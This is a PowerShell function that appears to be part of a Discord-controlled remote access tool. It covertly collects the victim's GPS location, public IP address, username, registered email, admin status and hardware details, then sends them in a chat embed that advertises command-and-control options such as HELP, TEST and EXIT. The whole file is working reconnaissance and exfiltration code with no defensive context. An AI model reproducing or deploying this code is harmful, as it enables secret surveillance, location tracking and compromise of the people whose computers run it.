function MquickInfo {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Device
    
    try {
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        $timeout = 0
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied') -and ($timeout -lt 50)) {
            Start-Sleep -Milliseconds 100
            $timeout++
        }
        
        if ($GeoWatcher.Permission -eq 'Denied' -or $timeout -ge 50) {
            $GPS = "Location Services Off"
        } else {
            $GL = $GeoWatcher.Position.Location | Select-Object Latitude, Longitude
            $GL = $GL -split " "
            $Lat = $GL[0].Substring(11) -replace ".$"
            $Lon = $GL[1].Substring(10) -replace ".$"
            $GPS = "LAT = $Lat LONG = $Lon"
        }
        $GeoWatcher.Stop()
        $GeoWatcher.Dispose()
    } catch {
        $GPS = "Location Services Error"
    }
    
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    } else {
        $adminperm = "True"
    }
    
    try {
        $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
        $userInfo = Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }
        $processorInfo = Get-WmiObject -Class Win32_Processor
        $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
        $videocardinfo = Get-WmiObject Win32_VideoController | Select-Object -First 1
        
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Width = $Screen.Width
        $Height = $Screen.Height
        $screensize = "${width} x ${height}"
        
        $email = try { (Get-ComputerInfo).WindowsRegisteredOwner } catch { "Unknown" }
        $OSString = "$($systemInfo.Caption)"
        $OSArch = "$($systemInfo.OSArchitecture)"
        $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { "{0:N1} GB" -f ($_.sum / 1GB) }
        $processor = "$($processorInfo.Name)"
        $gpu = "$($videocardinfo.Name)"
        
        try {
            $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
        } catch {
            $ver = "Unknown"
        }
        
        $systemLocale = Get-WinSystemLocale
        $systemLanguage = $systemLocale.Name
        
        try {
            $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing -TimeoutSec 10).Content.Trim()
        } catch {
            $computerPubIP = "Unable to retrieve"
        }
        
        $jsonPayload = @{
            username = $env:COMPUTERNAME
            tts = $false
            embeds = @(
                @{
                    title = "$env:COMPUTERNAME | Computer Information"
                    description = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````

:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$systemLanguage``
- **Administrator Session** : ``$adminperm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$OSString - $ver``
- **Architecture**          : ``$OSArch``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$computerPubIP``
- **Location Information**  : ``$GPS``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$processor``
- **Memory**                : ``$RamInfo``
- **GPU**                   : ``$gpu``
- **Screen Size**           : ``$screensize``

``````AVAILABLE COMMANDS``````
- **HELP**                  : Show the help menu with all commands
- **TEST**                  : Test connection to Coral Network
- **EXIT**                  : Close this session
"@
                    color = 65280
                }
            )
        }
        
        sendMsg -Embed $jsonPayload
        
    } catch {
        sendMsg -Message ":x: **Error gathering system information:** $($_.Exception.Message)"
    }
}